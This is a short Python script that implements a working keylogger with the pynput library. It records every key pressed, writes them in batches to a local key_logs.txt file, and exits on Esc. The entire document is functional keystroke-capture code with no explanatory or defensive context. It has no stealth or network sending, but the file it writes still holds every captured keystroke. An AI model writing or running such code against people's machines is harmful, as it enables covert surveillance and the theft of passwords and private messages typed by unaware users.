import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global count, keys

    keys.append(key)
    count += 1
    print(key)

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []
        print("Keys saved to file")

def write_file(keys):
    with open("key_logs.txt", "a") as f:
        for key in keys:
            f.write(str(key))
    

def on_release(key):
    if key == Key.esc:
        print("Ending Key Logger")
        return False
    





with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()